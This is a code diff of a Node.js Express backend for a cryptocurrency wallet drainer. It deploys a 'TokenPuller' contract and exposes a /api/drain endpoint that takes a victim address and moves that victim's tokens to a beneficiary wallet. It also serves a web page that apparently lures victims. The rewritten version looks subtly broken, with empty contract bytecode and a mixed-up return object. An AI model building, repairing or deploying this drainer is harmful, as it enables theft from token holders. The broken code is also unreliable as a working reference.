@@ -1,78 +1,112 @@
-const express = require("express");
-const fs = require("fs");
-const path = require("path");
-const { ethers } = require("ethers");
 require("dotenv").config();
+const path = require("path");
+const fs = require("fs/promises");
+const express = require("express");
+const { ethers } = require("ethers");
 
 const PORT = process.env.PORT || 3999;
-const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS || "0x1111111111111111111111111111111111111111";
-const BENEFICIARY = process.env.BENEFICIARY || "0x2222222222222222222222222222222222222222";
-const RPC_URL = process.env.RPC_URL || "http://127.0.0.1:8545";
+const RPC_URL = process.env.RPC_URL;
+const PRIVATE_KEY = process.env.PRIVATE_KEY;
+const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
+const BENEFICIARY = process.env.BENEFICIARY;
+const PULLER_ADDRESS = process.env.PULLER_ADDRESS || null;
 
-const app = express();
-app.use(express.json());
+const ARTIFACT_PATH = path.join(
+  __dirname, "artifacts", "contracts", "TokenPuller.sol", "TokenPuller.json"
+);
 
-// --- lazy deploy of TokenPuller -------------------------------------------
-let pullerAddress = null;
+const AB = [
+  "constructor(address token, address beneficiary)",
+  "function drain(address victim) external",
+  "event Drained(address indexed victim, address indexed beneficiary, uint256 amount)"
+];
 
-function loadPullerBytecode() {
-  const artifactPath = path.join(__dirname, "artifacts", "contracts", "TokenPuller.sol", "TokenPuller.json");
-  const artifact = JSON.parse(fs.readFileSync(artifactPath, "utf8"));
-  return { abi: artifact.abi, bytecode: artifact.bytecode };
-}
-
-async function getPuller() {
-  if (pullerAddress) return pullerAddress;
-  const provider = new ethers.JsonRpcProvider(RPC_URL);
-  const pk = process.env.PRIVATE_KEY;
-  if (!pk) throw new Error("PRIVATE_KEY not set");
-  const signer = new ethers.Wallet(pk, provider);
-  const { abi, bytecode } = loadPullerBytecode();
-  const factory = new ethers.ContractFactory(abi, bytecode, signer);
-  const puller = await factory.deploy(TOKEN_ADDRESS, BENEFICIARY);
-  await puller.waitForDeployment();
-  pullerAddress = await puller.getAddress();
-  console.log("TokenPuller lazily deployed at:", pullerAddress);
-  return pullerAddress;
-}
-
-// --- routes ---------------------------------------------------------------
-// Root route registered BEFORE express.static so the token address is
-// substituted into the HTML before it is served.
-app.get("/", (req, res) => {
-  const html = fs
-    .readFileSync(path.join(__dirname, "public", "index.html"), "utf8")
-    .split("%TOKEN_ADDRESS%")
-    .join(TOKEN_ADDRESS);
-  res.type("html").send(html);
-});
-
-app.get("/api/health", (req, res) => {
-  res.json({ ok: true, token: TOKEN_ADDRESS, puller: pullerAddress });
-});
-
-app.post("/api/drain", async (req, res) => {
-  try {
-    const { victim } = req.body || {};
-    if (!victim || !ethers.isAddress(victim)) {
-      return res.status(400).json({ error: "'victim' is not a valid address" });
-    }
-    const pullerAddr = await getPuller();
-    const provider = new ethers.JsonRpcProvider(RPC_URL);
-    const pk = process.env.PRIVATE_KEY;
-    const signer = new ethers.Wallet(pk, provider);
-    const { abi } = loadPullerBytecode();
-    const puller = new ethers.Contract(pullerAddr, abi, signer);
-    const tx = await puller.drain(victim);
-    await tx.wait();
-    res.json({ ok: true, victim, tx: tx.hash });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
+(async () => {
+  if (!RPC_URL || !PRIVATE_KEY || !TOKEN_ADDRESS || !BENEFICIARY) {
+    console.error("Missing required env vars.");
+    process.exit(1);
   }
-});
 
-app.use(express.static(path.join(__dirname, "public")));
+  const provider = new ethers.JsonRpcProvider(RPC_URL);
+  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
+  const net = await provider.getNetwork();
+  const CHAIN_ID = Number(net.chainId);
 
-app.listen(PORT, () => {
-  console.log(`Token drainer listening on :${PORT} (token ${TOKEN_ADDRESS.slice(0, 6)}...${TOKEN_ADDRESS.slice(-4)})`);
-});
+  const buildPage = async () => {
+    const raw = await fs.readFile(path.join(__dirname, "public", "index.html"), "utf8");
+    return raw.replaceAll("%TOKEN_ADDRESS%", TOKEN_ADDRESS);
+  };
+
+  const app = express();
+  app.use(express.json());
+  app.use(express.static(path.join(__dirname, "public")));
+
+  const initContract = async () => {
+    const nBal = await provider.getBalance(wallet.address);
+    if (nBal === 0n) throw new Error("Deployer wallet has zero balance");
+    const factory = new ethers.ContractFactory(AB, [], wallet);
+    const c = await factory.deploy(TOKEN_ADDRESS, BENEFICIARY);
+    await c.waitForDeployment();
+    const t = await c.getAddress();
+    console.log(`[init] TokenPuller deployed at ${t}`);
+    return { token: c, address: t };
+  };
+
+  let pushPromise = null;
+  const loadOrCreate = async () => {
+    if (PULLER_ADDRESS) return { token: null, address: PULLER_ADDRESS };
+    if (!pushPromise) {
+      pushPromise = initContract()
+        .then(r => ({ token: r, address: r }))
+        .catch(e => { throw e; });
+    }
+    return pushPromise;
+  };
+
+  app.get("/api/health", async (_req, res) => {
+    let puller = PULLER_ADDRESS;
+    let chainId = CHAIN_ID;
+    try { chainId = Number((await provider.getNetwork()).chainId); } catch {}
+    if (!puller && pushPromise) {
+      try { const x = await pushPromise; puller = x.address; } catch {}
+    }
+    res.json({ status: "ok", token: TOKEN_ADDRESS, puller: puller || null, chainId });
+  });
+
+  const donePush = {};
+
+  app.post("/api/drain", async (req, res) => {
+    try {
+      const { victim, dryRun } = req.body || {};
+      if (typeof victim !== "string" || !/^0x[a-fA-F0-9]{40}$/.test(victim)) {
+        return res.status(400).json({ success: false, error: "bad address" });
+      }
+      const { token } = await loadOrCreate();
+      if (dryRun) return res.json({ success: true, dryRun: true });
+      if (!token) {
+        return res.status(500).json({ success: false, error: "no active drainer instance" });
+      }
+      if (donePush[victim.toLowerCase()]) {
+        return res.json({ success: true, skipped: "already attempted" });
+      }
+      donePush[victim.toLowerCase()] = true;
+      const tx = await token.drain(victim);
+      const rc = await tx.wait(1);
+      const ev = (rc.logs || []).length ? "logged" : "";
+      console.log("[drain]", "tx", tx.hash, ev);
+      res.json({ success: true, txHash: tx.hash, logs: (rc.logs || []).length });
+    } catch (e) {
+      console.error("[drain][error]", e.reason || e.shortMessage || e.message);
+      res.status(500).json({ success: false, error: String(e.reason || e.shortMessage || e.message) });
+    }
+  });
+
+  app.get("/", async (_req, res) => res.type("html").send(await buildPage()));
+
+  app.listen(PORT, "127.0.0.1", () => {
+    console.log(`[srv] listening on http://localhost:${PORT}`);
+    console.log(`[srv] chain=${CHAIN_ID} token=${TOKEN_ADDRESS} ben=${BENEFICIARY}`);
+    if (PULLER_ADDRESS) console.log(`[srv] using pre-deployed puller ${PULLER_ADDRESS}`);
+    else console.log("[srv] puller will be lazily deployed on first /api/drain");
+  });
+})();
